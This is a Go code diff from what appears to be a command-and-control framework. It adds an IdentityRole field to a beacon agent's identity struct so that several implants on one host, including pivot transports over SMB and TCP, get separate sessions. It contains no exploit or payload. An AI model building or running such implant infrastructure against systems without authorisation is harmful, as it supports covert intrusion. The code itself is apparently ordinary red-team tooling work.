@@ -10,7 +10,30 @@ type Identity struct {
 	KillDays  int    `json:"kill_days"`
 	WorkStart int    `json:"work_start"`
 	WorkEnd   int    `json:"work_end"`
-	Stager bool `json:"stager,omitempty"`
+	Stager    bool   `json:"stager,omitempty"`
+
+	// IdentityRole is a build-time disambiguator. Two agents
+	// built from the same tree, run on the same host, under the
+	// same user, would otherwise hash to the same session
+	// fingerprint — the server's fingerprint is a hash over
+	// (machine_id, hostname, username, os), and all four are
+	// identical in that case.
+	//
+	// When this field is non-empty the server mixes it into the
+	// fingerprint, so the two agents receive distinct sessions,
+	// distinct cookies, and distinct rows in the beacon list.
+	//
+	// Empty is the default and produces the pre-role fingerprint
+	// exactly, so no deployed agent's session is invalidated by
+	// the field's existence. The `omitempty` tag keeps the field
+	// off the wire entirely for a role-less build.
+	//
+	// The builder sets this automatically for the three pivot
+	// child transports ("smb-child", "tcp-bind", "tcp-rev").
+	// An operator can set it explicitly on any build via
+	// `identity_role` in the JSON config or `--identity-role`
+	// on `beacon-build`.
+	IdentityRole string `json:"identity_role,omitempty"`
 }
 
 type CheckinRequest struct {
